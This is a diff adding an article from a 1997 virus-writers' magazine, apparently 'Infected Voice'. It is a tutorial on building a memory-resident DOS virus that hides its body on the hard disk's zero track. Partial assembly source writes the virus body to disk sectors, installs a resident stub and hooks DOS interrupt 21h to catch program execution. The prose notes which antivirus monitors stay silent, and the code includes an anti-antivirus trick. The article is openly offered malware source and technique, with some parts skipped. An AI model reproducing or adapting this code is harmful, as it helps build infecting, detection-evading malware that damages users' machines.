@@ -1,0 +1,183 @@
+
+      ÜÜ                  Û
+     ßßß  Virus Magazine  Û Box 176, Kiev 210, Ukraine      IV  1997
+     ßÛÛ ßßßßßßßßßßßßßßßß Û ßßßßßßßßßßßßßßßßßßß ß ßßßßÞßßß  ÛßßßßßßÛ
+      ÞÛ ÛßÜ Ûßß Üßß Üßß ÜÛÜ Üßß ÛßÛ    Ý Û ÜßÛ Û Üßß ÛÜÜ   Û ßßßÛ Û
+       Û Û Û Ûß  Ûß  Û    Û  Ûß  Û Û    Û Û Û Û Û Û   Û     Û ÜÜÜÛ Û
+       Û Þ Þ Þ   ÞÜÜ ÞÜÜ  Þ  ÞÜÜ ÞÜß     ßÛ ßÜÛ Þ ÞÜÜ ÞÜÜÜ  Û ÛÜÜÜ Û
+       Þ ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ  ÛÜÜÜÜÜÜÛ
+          (C) Copyright, 1994-97, by STEALTH group WorldWide, unLtd.
+                              sgww@hotmail.com
+            Digest of IV 8 - 11 russian, including Moscow issues
+
+ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+³ Virus with "overlay" loader                  ³(C) LovinGOD            ³
+ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+          Convertional memory is very short :), so virmakers started to use
+XMS, EMS and so on. And what about cool virus, that takes about 50 bytes of
+convertional memory?
+
+  We gotta answer these questions to realize such virus algoritm:
+
+1. Where may we keep our resident loader of "overlay" part (those 50
+   bytes)?
+
+  + Interrupts table
+  + DOS stack, DOS buffers and so on
+  + Little memory block
+      (AVPTSR, -D, VSAFE, ANTIAPE do not cry if we take memory block
+      smaller than 512b).
+  + Free 100h bytes of 60 segment
+      DOS uses these bytes only while booting;
+      Load COMMAND.COM, load WINDOWS and quit from it - you'll see that
+      this memory block always stays the same.
+
+2. Where may we keep big main body of our interrupt handler ?
+
+   To the end of RAM, to segments > 9800h. You'll overwrite transit part of
+   COMMAND.COM, don't care - let him say "Thanks" that we didn't infect
+   him ;)
+   You DON'T NEED to pick out memory block. Nobody can destroy virus body
+   while virus works.
+
+3. Where may we hide "overlay" virus body ?
+   + Zero track.
+     NOTE: don't write virus body from 0/0/2, skip 10 - 20 sectors, 'cause
+           there's a lot of huge boot managers written by idiots
+   + Somewhere on HDD...
+   + Read body from infected file (worst way)
+
+   ------------------------------------------------------------------------
+
+   So, we have little int 21h handler in memory. When some "virus" function
+   is called (4bh, 3dh, 3eh or something else), we read our "overlay" part
+   from zero track to the end of convertional memory and give control to
+   it.
+
+;--------------------------------------------------------------------------
+;                COM-file header
+.MODEL TINY
+.CODE
+.RADIX 16
+.386P
+ ORG 100
+;--------------------------------------------------------------------------
+ VIR_SECCOUNT    EQU 4          ; sectors count for virus body
+ SEC_SINCE       EQU 0A         ; number of sector, where we will write
+                                ; virus body
+ OVL_SEG         EQU 09A00      ; Segment of memory where we will load
+                                ; "overlay" part
+;--------------------------------------------------------------------------
+START:
+VIRUS:
+
+; ...
+
+; If there's no virus copy in memory, we write our body to zero track
+; and install virus to memory
+
+PC_POSSESS:
+  PUSH CS CS
+  POP  DS ES
+                                ; write virus body to the disk
+  MOV AX,0300+VIR_SECCOUNT
+  MOV CX,0000+SEC_SINCE
+  MOV DX,0080
+  MOV BX,BP                     ; BP = offset of virus start
+  CALL INT_13
+  JC  CUREINRAM
+                                ; install permanent resident part
+                                ; to 0060:0000
+  MOV AX,0060
+  MOV ES,AX
+  MOV SI,BP
+  ADD SI,SIXTYSEG-VIRUS
+  XOR DI,DI
+  MOV CX,(END_SIXTYSEG-SIXTYSEG)/4+1
+  CLD
+  REP MOVSD
+
+; ...   hook interrupts (skipped)
+
+SIXTYSEG:               ; Segment 60h - permanent resident part
+
+ MY21_60:               ; INT 21h handler
+
+  CMP AH,0F1
+  JNE NXTFNC
+  IRET
+                        ; check for fn.4b00h (load and execute)
+ NXTFNC:
+  xchg ax,bx            ; anti-AVP trick
+  CMP bx,4B00
+  xchg ax,bx
+  JNE JMPF21_60
+
+  PUSHA
+  PUSH DS ES
+
+  MOV AX,OVL_SEG
+  MOV ES,AX
+                              ; read "overlay" part from disk
+  MOV AX,0200+VIR_SECCOUNT
+  MOV CX,0000+SEC_SINCE
+  MOV DX,0080
+  XOR BX,BX
+  CALL INT_13
+  JC  POP_JMPF21_60           ; if there was some error - give control
+                              ; to old int 21h
+
+  DB 0EA                          ; jump to our "overlay" handler of
+  DD OVL_SEG*10000+(MY21-VIRUS)   ; int 21h
+
+ CLEAR_OVL_EXIT21:
+
+ POP_JMPF21_60:
+  POP ES DS
+  POPA
+
+ JMPF21_60:
+  DB 0EA
+  OLD21_60 DD ?
+
+;------------------------- procedure of INT 13h call (for compatibility
+                           with Win95 - see WIN0TRAK.IV2 for details)
+INT_13 PROC
+  PUSH AX
+  WIN_VER EQU $+1
+  MOV AL,00
+  CMP AL,4
+  POP AX
+  JNE JUST_INT13
+
+  PUSHF
+  DB 09A
+  DD 007003EEh
+  RETN
+
+  JUST_INT13: INT 13
+  RETN
+  INT_13 ENDP
+;------------------------------------------------
+END_SIXTYSEG:
+
+;------------------- "overlay" resident part
+OVERLAY:
+MY21:
+
+; ... function handler skipped
+
+  JMP 4 PTR CS:[TMP_RETFADDR-VIRUS]     ; back to permanent resident part
+
+                        ; procedure to call DOS from handler
+ CALLDOS:
+  PUSH 0060
+  POP  FS
+  PUSHF
+  CALL 4 PTR FS:[OLD21_60-SIXTYSEG]
+  RETN
+
+  TMP_RETFADDR DD 00600000+(CLEAR_OVL_EXIT21-SIXTYSEG)  ; return address
+
+END_OVERLAY:
